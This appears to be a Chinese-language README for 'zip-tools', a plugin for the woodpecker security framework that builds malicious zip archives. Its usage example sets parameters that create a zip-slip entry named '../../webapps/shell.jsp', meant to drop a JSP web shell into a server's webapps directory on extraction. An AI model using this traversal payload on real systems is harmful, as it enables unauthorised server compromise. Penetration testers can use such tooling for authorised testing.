# zip-tools

## 0x01 简介
`zip-tools`是 [woodpecker框架](https://github.com/woodpecker-framework/woodpecker-framwork-release/releases) 生成各类恶意zip文件的辅助插件。

* [x] zip slip
* [ ] ascii zip
* [ ] zip add dirty data

## 0x02 使用
生成一个符合如下条件的压缩文件

1. README.md文件
2. `..\..\..\webapps\shell.jsp`文件
3. config文件夹

可以如参数如下：

```
compress_file_name_1=README.md
compress_file_1=/tmp/readme.md
compress_file_name_2=../../webapps/shell.jsp
compress_file_2=/tmp/shell.txt
compress_dir_name_3=config
save_file=/tmp/evil.zip
```

![](./docs/zip-slip.png)

![](./docs/evil-zip.png)

测试解压效果，验证是否生效

![](./docs/unzip-test.png)
